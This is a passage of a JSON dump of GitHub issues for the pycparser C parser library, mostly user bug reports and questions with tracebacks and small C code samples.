Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1582: No documentation string specified in function 'p_assignment_operator' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1597: No documentation string specified in function 'p_constant_expression' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1601: No documentation string specified in function 'p_conditional_expression' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1610: No documentation string specified in function 'p_binary_expression' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1636: No documentation string specified in function 'p_cast_expression_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1640: No documentation string specified in function 'p_cast_expression_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1644: No documentation string specified in function 'p_unary_expression_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1648: No documentation string specified in function 'p_unary_expression_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1655: No documentation string specified in function 'p_unary_expression_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1664: No documentation string specified in function 'p_unary_operator' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1674: No documentation string specified in function 'p_postfix_expression_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1678: No documentation string specified in function 'p_postfix_expression_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1682: No documentation string specified in function 'p_postfix_expression_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1688: No documentation string specified in function 'p_postfix_expression_4' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1697: No documentation string specified in function 'p_postfix_expression_5' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1703: No documentation string specified in function 'p_postfix_expression_6' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1709: No documentation string specified in function 'p_primary_expression_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1713: No documentation string specified in function 'p_primary_expression_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1717: No documentation string specified in function 'p_primary_expression_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1723: No documentation string specified in function 'p_primary_expression_4' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1727: No documentation string specified in function 'p_primary_expression_5' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1735: No documentation string specified in function 'p_offsetof_member_designator' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1750: No documentation string specified in function 'p_argument_expression_list' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1760: No documentation string specified in function 'p_identifier' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1764: No documentation string specified in function 'p_constant_1' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1773: No documentation string specified in function 'p_constant_2' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1790: No documentation string specified in function 'p_constant_3' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1802: No documentation string specified in function 'p_unified_string_literal' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1813: No documentation string specified in function 'p_unified_wstring_literal' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1824: No documentation string specified in function 'p_brace_open' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1830: No documentation string specified in function 'p_brace_close' (ignored)\r\nWARNING: C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py:1836: No documentation string specified in function 'p_empty' (ignored)\r\nERROR: start symbol translation_unit_or_empty undefined\r\nTraceback (most recent call last):\r\n  File \"C:\\Program Files\\Python36\\lib\\runpy.py\", line 183, in _run_module_as_main\r\n    mod_name, mod_spec, code = _get_module_details(mod_name, _Error)\r\n  File \"C:\\Program Files\\Python36\\lib\\runpy.py\", line 142, in _get_module_details\r\n    return _get_module_details(pkg_main_name, error)\r\n  File \"C:\\Program Files\\Python36\\lib\\runpy.py\", line 109, in _get_module_details\r\n    __import__(pkg_name)\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\PyInstaller\\__init__.py\", line 16, in <module>\r\n    from . import compat\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\PyInstaller\\compat.py\", line 212, in <module>\r\n    from win32ctypes.pywin32 import pywintypes  # noqa: F401\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\win32ctypes\\pywin32\\__init__.py\", line 11, in <module>\r\n    from win32ctypes.pywin32 import win32api\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\win32ctypes\\pywin32\\win32api.py\", line 12, in <module>\r\n    from win32ctypes.core import (\r\n  File \"<frozen importlib._bootstrap>\", line 971, in _find_and_load\r\n  File \"<frozen importlib._bootstrap>\", line 955, in _find_and_load_unlocked\r\n  File \"<frozen importlib._bootstrap>\", line 656, in _load_unlocked\r\n  File \"<frozen importlib._bootstrap>\", line 626, in _load_backward_compatible\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\win32ctypes\\core\\__init__.py\", line 36, in load_module\r\n    module = importlib.import_module(self.redirect_module)\r\n  File \"C:\\Program Files\\Python36\\lib\\importlib\\__init__.py\", line 126, in import_module\r\n    return _bootstrap._gcd_import(name[level:], package, level)\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\win32ctypes\\core\\cffi\\_common.py\", line 12, in <module>\r\n    from ._util import ffi\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\win32ctypes\\core\\cffi\\_util.py\", line 17, in <module>\r\n    ffi.set_unicode(True)\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\cffi\\api.py\", line 540, in set_unicode\r\n    self.cdef(\"typedef wchar_t TBYTE;\"\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\cffi\\api.py\", line 107, in cdef\r\n    self._cdef(csource, override=override, packed=packed)\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\cffi\\api.py\", line 121, in _cdef\r\n    self._parser.parse(csource, override=override, **options)\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\cffi\\cparser.py\", line 315, in parse\r\n    self._internal_parse(csource)\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\cffi\\cparser.py\", line 320, in _internal_parse\r\n    ast, macros, csource = self._parse(csource)\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\cffi\\cparser.py\", line 276, in _parse\r\n    ast = _get_parser().parse(fullcsource)\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\cffi\\cparser.py\", line 45, in _get_parser\r\n    _parser_cache = pycparser.CParser()\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\c_parser.py\", line 117, in __init__\r\n    outputdir=taboutputdir)\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\pycparser\\ply\\yacc.py\", line 3352, in yacc\r\n    raise YaccError('Unable to build parser')\r\npycparser.ply.yacc.YaccError: Unable to build parser\r\n```\r\n\r\nHow to fix it?\r\nThe error draws me crazy because pycparser is installed as PyMySQL dependency (or maybe as cffi 1.11.5) dependency) and it blocks me to create new version of my app...", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/290", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/290/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/290/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/290/events", "html_url": "https://github.com/eliben/pycparser/issues/290", "id": 377085767, "node_id": "MDU6SXNzdWUzNzcwODU3Njc=", "number": 290, "title": "Add `NodeTransformer`?", "user": {"login": "yxwangcs", "id": 10323518, "node_id": "MDQ6VXNlcjEwMzIzNTE4", "avatar_url": "https://avatars2.githubusercontent.com/u/10323518?v=4", "gravatar_id": "", "url": "https://api.github.com/users/yxwangcs", "html_url": "https://github.com/yxwangcs", "followers_url": "https://api.github.com/users/yxwangcs/followers", "following_url": "https://api.github.com/users/yxwangcs/following{/other_user}", "gists_url": "https://api.github.com/users/yxwangcs/gists{/gist_id}", "starred_url": "https://api.github.com/users/yxwangcs/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/yxwangcs/subscriptions", "organizations_url": "https://api.github.com/users/yxwangcs/orgs", "repos_url": "https://api.github.com/users/yxwangcs/repos", "events_url": "https://api.github.com/users/yxwangcs/events{/privacy}", "received_events_url": "https://api.github.com/users/yxwangcs/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-11-03T19:28:13Z", "updated_at": "2018-11-05T18:36:18Z", "closed_at": "2018-11-05T18:36:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "It would be nice if the package can provide a NodeTransformer as the python's ast package does, since this already has a NodeVisitor class.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/289", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/289/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/289/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/289/events", "html_url": "https://github.com/eliben/pycparser/issues/289", "id": 376301653, "node_id": "MDU6SXNzdWUzNzYzMDE2NTM=", "number": 289, "title": "Parse postgresql -pycparser.plyparser.ParseError before: pgwin32_signal_event", "user": {"login": "aditi9292", "id": 44602279, "node_id": "MDQ6VXNlcjQ0NjAyMjc5", "avatar_url": "https://avatars3.githubusercontent.com/u/44602279?v=4", "gravatar_id": "", "url": "https://api.github.com/users/aditi9292", "html_url": "https://github.com/aditi9292", "followers_url": "https://api.github.com/users/aditi9292/followers", "following_url": "https://api.github.com/users/aditi9292/following{/other_user}", "gists_url": "https://api.github.com/users/aditi9292/gists{/gist_id}", "starred_url": "https://api.github.com/users/aditi9292/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/aditi9292/subscriptions", "organizations_url": "https://api.github.com/users/aditi9292/orgs", "repos_url": "https://api.github.com/users/aditi9292/repos", "events_url": "https://api.github.com/users/aditi9292/events{/privacy}", "received_events_url": "https://api.github.com/users/aditi9292/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2018-11-01T08:39:22Z", "updated_at": "2019-02-16T13:44:40Z", "closed_at": "2018-11-01T12:09:09Z", "author_association": "NONE", "active_lock_reason": null, "body": "I need to parse an open-source project Postgresql using pycparser. \r\n\r\nWhile parsing its source-code the following error arises:\r\nTraceback (most recent call last):\r\n  File \"examples\\using_cpp_libc.py\", line 48, in <module>\r\n    getAllFiles(projectName)\r\n  File \"examples\\using_cpp_libc.py\", line 29, in getAllFiles\r\n    ast = parse_file(dirName+'\\\\'+fname, use_cpp = True, cpp_path = 'cpp', cpp_args = [r'-nostdinc',r'-Iutils/fake_libc_include',r'-Iprojects/postgresql/src/include'])\r\n  File \"G:\\python\\pycparser-master\\pycparser\\__init__.py\", line 92, in parse_file\r\n    return parser.parse(text, filename)\r\n  File \"G:\\python\\pycparser-master\\pycparser\\c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"G:\\python\\pycparser-master\\pycparser\\ply\\yacc.py\", line 334, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"G:\\python\\pycparser-master\\pycparser\\ply\\yacc.py\", line 1204, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"G:\\python\\pycparser-master\\pycparser\\ply\\yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"G:\\python\\pycparser-master\\pycparser\\c_parser.py\", line 1838, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"G:\\python\\pycparser-master\\pycparser\\plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\n**pycparser.plyparser.ParseError: projects/postgresql/src/include/pg_config_os.h:366:15: before: pgwin32_signal_event**\r\n\r\nI am using postgresql-9.6.9, build it using visual studio express 2017 on windows 10 (64-bit)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/288", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/288/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/288/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/288/events", "html_url": "https://github.com/eliben/pycparser/issues/288", "id": 375642685, "node_id": "MDU6SXNzdWUzNzU2NDI2ODU=", "number": 288, "title": "No wheels on PyPi", "user": {"login": "darkvertex", "id": 941331, "node_id": "MDQ6VXNlcjk0MTMzMQ==", "avatar_url": "https://avatars0.githubusercontent.com/u/941331?v=4", "gravatar_id": "", "url": "https://api.github.com/users/darkvertex", "html_url": "https://github.com/darkvertex", "followers_url": "https://api.github.com/users/darkvertex/followers", "following_url": "https://api.github.com/users/darkvertex/following{/other_user}", "gists_url": "https://api.github.com/users/darkvertex/gists{/gist_id}", "starred_url": "https://api.github.com/users/darkvertex/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/darkvertex/subscriptions", "organizations_url": "https://api.github.com/users/darkvertex/orgs", "repos_url": "https://api.github.com/users/darkvertex/repos", "events_url": "https://api.github.com/users/darkvertex/events{/privacy}", "received_events_url": "https://api.github.com/users/darkvertex/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2018-10-30T18:52:59Z", "updated_at": "2019-10-06T11:16:35Z", "closed_at": "2019-04-19T12:38:14Z", "author_association": "NONE", "active_lock_reason": null, "body": "Would be super nice if we had .whl (Python wheel) files in PyPi:\r\nhttps://pypi.org/project/pycparser/#files\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/287", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/287/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/287/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/287/events", "html_url": "https://github.com/eliben/pycparser/issues/287", "id": 374221611, "node_id": "MDU6SXNzdWUzNzQyMjE2MTE=", "number": 287, "title": "Extracting more information about for loop inside a function", "user": {"login": "vishal-purohit", "id": 26171922, "node_id": "MDQ6VXNlcjI2MTcxOTIy", "avatar_url": "https://avatars1.githubusercontent.com/u/26171922?v=4", "gravatar_id": "", "url": "https://api.github.com/users/vishal-purohit", "html_url": "https://github.com/vishal-purohit", "followers_url": "https://api.github.com/users/vishal-purohit/followers", "following_url": "https://api.github.com/users/vishal-purohit/following{/other_user}", "gists_url": "https://api.github.com/users/vishal-purohit/gists{/gist_id}", "starred_url": "https://api.github.com/users/vishal-purohit/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/vishal-purohit/subscriptions", "organizations_url": "https://api.github.com/users/vishal-purohit/orgs", "repos_url": "https://api.github.com/users/vishal-purohit/repos", "events_url": "https://api.github.com/users/vishal-purohit/events{/privacy}", "received_events_url": "https://api.github.com/users/vishal-purohit/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-10-26T04:23:54Z", "updated_at": "2019-08-26T22:14:05Z", "closed_at": "2019-08-26T22:14:05Z", "author_association": "NONE", "active_lock_reason": null, "body": "How do I exactly know how many times a for loop can execute using pycparser?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/286", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/286/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/286/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/286/events", "html_url": "https://github.com/eliben/pycparser/issues/286", "id": 373387575, "node_id": "MDU6SXNzdWUzNzMzODc1NzU=", "number": 286, "title": "ParseError in fake_typedefs", "user": {"login": "Xfel", "id": 2306230, "node_id": "MDQ6VXNlcjIzMDYyMzA=", "avatar_url": "https://avatars1.githubusercontent.com/u/2306230?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Xfel", "html_url": "https://github.com/Xfel", "followers_url": "https://api.github.com/users/Xfel/followers", "following_url": "https://api.github.com/users/Xfel/following{/other_user}", "gists_url": "https://api.github.com/users/Xfel/gists{/gist_id}", "starred_url": "https://api.github.com/users/Xfel/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Xfel/subscriptions", "organizations_url": "https://api.github.com/users/Xfel/orgs", "repos_url": "https://api.github.com/users/Xfel/repos", "events_url": "https://api.github.com/users/Xfel/events{/privacy}", "received_events_url": "https://api.github.com/users/Xfel/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-10-24T09:26:15Z", "updated_at": "2018-10-24T13:42:02Z", "closed_at": "2018-10-24T13:42:02Z", "author_association": "NONE", "active_lock_reason": null, "body": "```\r\npycparser.plyparser.ParseError: [...]/python3.5/site-packages/autopxd/include/_fake_typedefs.h:151:9: Invalid declaration\r\n```\r\n\r\nThe line in question is:\r\n```\r\n/* C99 stdbool.h bool type. _Bool is built-in in C99 */\r\ntypedef _Bool bool;\r\n```\r\n\r\nThe likely cause for this is that our own headers use a custom define for the bool type instead of including stdbool.h. In general though, always including all the typedefs in _fake_typedefs.h creates this issue since they create unexpected typedefs.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/285", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/285/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/285/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/285/events", "html_url": "https://github.com/eliben/pycparser/issues/285", "id": 372773190, "node_id": "MDU6SXNzdWUzNzI3NzMxOTA=", "number": 285, "title": "Why pycparser can not parse multiple func call in one single line??", "user": {"login": "zmcrazy", "id": 31725114, "node_id": "MDQ6VXNlcjMxNzI1MTE0", "avatar_url": "https://avatars2.githubusercontent.com/u/31725114?v=4", "gravatar_id": "", "url": "https://api.github.com/users/zmcrazy", "html_url": "https://github.com/zmcrazy", "followers_url": "https://api.github.com/users/zmcrazy/followers", "following_url": "https://api.github.com/users/zmcrazy/following{/other_user}", "gists_url": "https://api.github.com/users/zmcrazy/gists{/gist_id}", "starred_url": "https://api.github.com/users/zmcrazy/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/zmcrazy/subscriptions", "organizations_url": "https://api.github.com/users/zmcrazy/orgs", "repos_url": "https://api.github.com/users/zmcrazy/repos", "events_url": "https://api.github.com/users/zmcrazy/events{/privacy}", "received_events_url": "https://api.github.com/users/zmcrazy/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-10-23T02:02:56Z", "updated_at": "2018-10-23T21:06:43Z", "closed_at": "2018-10-23T21:06:43Z", "author_association": "NONE", "active_lock_reason": null, "body": "source code:\r\nint func_call(int a, int b)\r\n{\r\n\treturn a + b;\r\n}\r\n\r\nint main()\r\n{\r\n\tfunc_call(3, 4);\r\n\tprintf(\"result is: %d\\n\", func_call(5,6));\r\n}\r\n\r\nWhen I use the pycparser example file 'func_calls.py' in pycparser-master\\examples folder to test this source code:\r\n![image](https://user-images.githubusercontent.com/31725114/47330326-67429000-d6aa-11e8-9d7d-0c3372d797ac.png)\r\nBut I only got one 'func_call' result. But from the source code we can find that there are to 'func_call' , one is 'func_call(3,4)', another is 'printf(\"result is: %d\\n\", func_call(5,6));'\r\nWhy it only shows only one result?? \r\nResult: \r\nclang  -E -ID:\\Tools\\pycparser-master\\utils\\fake_libc_include D:\\py\\ctest2.cpp\r\nfunc_call called at D:\\\\py\\\\ctest2.cpp:30:2", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/284", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/284/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/284/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/284/events", "html_url": "https://github.com/eliben/pycparser/issues/284", "id": 372409346, "node_id": "MDU6SXNzdWUzNzI0MDkzNDY=", "number": 284, "title": "Is it possible to support cpp code by adding or rewriting some modules?", "user": {"login": "daisy0522", "id": 16043488, "node_id": "MDQ6VXNlcjE2MDQzNDg4", "avatar_url": "https://avatars0.githubusercontent.com/u/16043488?v=4", "gravatar_id": "", "url": "https://api.github.com/users/daisy0522", "html_url": "https://github.com/daisy0522", "followers_url": "https://api.github.com/users/daisy0522/followers", "following_url": "https://api.github.com/users/daisy0522/following{/other_user}", "gists_url": "https://api.github.com/users/daisy0522/gists{/gist_id}", "starred_url": "https://api.github.com/users/daisy0522/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/daisy0522/subscriptions", "organizations_url": "https://api.github.com/users/daisy0522/orgs", "repos_url": "https://api.github.com/users/daisy0522/repos", "events_url": "https://api.github.com/users/daisy0522/events{/privacy}", "received_events_url": "https://api.github.com/users/daisy0522/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-10-22T06:41:36Z", "updated_at": "2019-08-26T22:13:57Z", "closed_at": "2019-08-26T22:13:57Z", "author_association": "NONE", "active_lock_reason": null, "body": "", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/283", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/283/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/283/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/283/events", "html_url": "https://github.com/eliben/pycparser/issues/283", "id": 365210132, "node_id": "MDU6SXNzdWUzNjUyMTAxMzI=", "number": 283, "title": "unable to handle extern \"C\"", "user": {"login": "Krace", "id": 32964482, "node_id": "MDQ6VXNlcjMyOTY0NDgy", "avatar_url": "https://avatars1.githubusercontent.com/u/32964482?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Krace", "html_url": "https://github.com/Krace", "followers_url": "https://api.github.com/users/Krace/followers", "following_url": "https://api.github.com/users/Krace/following{/other_user}", "gists_url": "https://api.github.com/users/Krace/gists{/gist_id}", "starred_url": "https://api.github.com/users/Krace/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Krace/subscriptions", "organizations_url": "https://api.github.com/users/Krace/orgs", "repos_url": "https://api.github.com/users/Krace/repos", "events_url": "https://api.github.com/users/Krace/events{/privacy}", "received_events_url": "https://api.github.com/users/Krace/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-09-30T09:43:23Z", "updated_at": "2018-10-03T09:01:51Z", "closed_at": "2018-09-30T12:36:56Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello,I met the following problem while dump_ast,the source code was:\r\n```\r\n#ifdef __cplusplus\r\nextern \"C\" {\r\n#endif\r\n\r\n#include \"goo/gtypes.h\"\r\n```\r\n\r\nand the error was:\r\n```\r\nTraceback (most recent call last):\r\n  File \"examples/dump_ast.py\", line 24, in <module>\r\n    ast = parse_file(args.filename, use_cpp=False)\r\n  File \"./pycparser/__init__.py\", line 90, in parse_file\r\n    return parser.parse(text, filename)\r\n  File \"./pycparser/c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"./pycparser/ply/yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"./pycparser/ply/yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"./pycparser/ply/yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"./pycparser/c_parser.py\", line 1848, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"./pycparser/plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: poppler-0.68.0/utils/parseargs.h:28:8: before: \"C\"\r\n```\r\n\r\nWhat can I do to overcome this..or we can't solve this problem yet. thx :P", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/282", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/282/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/282/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/282/events", "html_url": "https://github.com/eliben/pycparser/issues/282", "id": 365166091, "node_id": "MDU6SXNzdWUzNjUxNjYwOTE=", "number": 282, "title": "Coord Line of iffalse in an if-else statement", "user": {"login": "Knightto2112", "id": 43709687, "node_id": "MDQ6VXNlcjQzNzA5Njg3", "avatar_url": "https://avatars3.githubusercontent.com/u/43709687?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Knightto2112", "html_url": "https://github.com/Knightto2112", "followers_url": "https://api.github.com/users/Knightto2112/followers", "following_url": "https://api.github.com/users/Knightto2112/following{/other_user}", "gists_url": "https://api.github.com/users/Knightto2112/gists{/gist_id}", "starred_url": "https://api.github.com/users/Knightto2112/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Knightto2112/subscriptions", "organizations_url": "https://api.github.com/users/Knightto2112/orgs", "repos_url": "https://api.github.com/users/Knightto2112/repos", "events_url": "https://api.github.com/users/Knightto2112/events{/privacy}", "received_events_url": "https://api.github.com/users/Knightto2112/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-09-29T20:52:47Z", "updated_at": "2020-03-03T14:40:13Z", "closed_at": "2020-03-03T14:40:13Z", "author_association": "NONE", "active_lock_reason": null, "body": "I tried to parse some C code with pycparser. I'm using the your sample code, func_defs.py as base.\r\n\r\nI want to get the line in which the \"else\" word appear on the source code. I used visit_If to visit if-else statement as follows\r\n\r\n```\r\ndef visit_If(self, node):\r\n   if node.iffalse is not None:\r\n      else_node = node.iffalse\r\n      else_node.show(showcoord=True)\r\n      self.generic_visit(else_node)\r\n```\r\n\r\nUsing a sample code below\r\n```\r\nint main()\r\n{\r\n    int x = 0;\r\n    int y = 1;\r\n\r\n    if(x == 0)\r\n    {\r\n        x++;\r\n    }\r\n    else\r\n    {\r\n        y++;\r\n    }\r\n}\r\n```\r\n\r\nThe output of it is:\r\n```\r\nCompound:  (at ./code.c:11:1)\r\n  UnaryOp: p++ (at ./code.c:12:9)\r\n    ID: y (at ./code.c:12:9)\r\n```\r\n\r\nLine 11 points to \"{\". There is no indication on what line \"else\" appeared on the code.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/281", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/281/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/281/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/281/events", "html_url": "https://github.com/eliben/pycparser/issues/281", "id": 361977507, "node_id": "MDU6SXNzdWUzNjE5Nzc1MDc=", "number": 281, "title": "version 2.19 broke compatibility with python 2.6", "user": {"login": "david-richer-adsk", "id": 3700430, "node_id": "MDQ6VXNlcjM3MDA0MzA=", "avatar_url": "https://avatars2.githubusercontent.com/u/3700430?v=4", "gravatar_id": "", "url": "https://api.github.com/users/david-richer-adsk", "html_url": "https://github.com/david-richer-adsk", "followers_url": "https://api.github.com/users/david-richer-adsk/followers", "following_url": "https://api.github.com/users/david-richer-adsk/following{/other_user}", "gists_url": "https://api.github.com/users/david-richer-adsk/gists{/gist_id}", "starred_url": "https://api.github.com/users/david-richer-adsk/starred{/owner}{/repo}", "subscriptions_url": 